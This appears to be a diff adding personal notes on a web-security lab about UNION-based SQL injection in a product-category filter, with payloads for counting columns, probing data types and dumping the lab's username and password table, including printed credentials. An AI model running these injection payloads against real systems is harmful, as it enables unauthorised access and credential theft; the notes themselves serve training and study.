@@ -1,0 +1,48 @@
+LAB DESCRIPTION
+1. SQLi vuln in product category 
+2. Database contains table called users and contains col: username, password
+GOAL
+1. retrieve all usernames and password 
+2. login as administrator
+
+PREREQUISITE
+
+1. Table: users
+    username | password
+    weirn, dsfsd
+    administrator, something
+    foo, foo
+
+2.  WHERE clause is used to filter results or records. And it is supported by a condition
+    It can be used with SELECT, UPDATE , DELETE etc
+    It can be used with operators such as >, <, >=, <=, =, LIKE, BETWEEN, IN
+    Eg: SELECT username, password FROM users WHERE username='foo' 
+
+ANALYSIS
+
+1. Find total cols
+    a)' UNION SELECT NULL-- 
+        <internal server error>
+    b)' UNION SELECT NULL, NULL--
+
+2. checking data type 
+    a)' UNION SELECT 'a', NULL--
+        <internal server error>
+    b)' UNION SELECT NULL, 'a'--
+        <internal server error>
+    c)' UNION SELECT 'a', 'a'--
+        displayed page
+
+    Both cols accept STRING datatype
+
+3. retrieve all usename and password
+    a)' UNION SELECT username, password FROM users--
+    wiener
+	4blmt1po6vyurx2uczky
+    carlos
+	h7kj0hyg8o605xbj187z
+    administrator
+	ihv1wf5ygwd13fm6sve3
+    b)' UNION SELECT username, password FROM users WHERE username ='administrator'--
+    administrator
+	ihv1wf5ygwd13fm6sve3
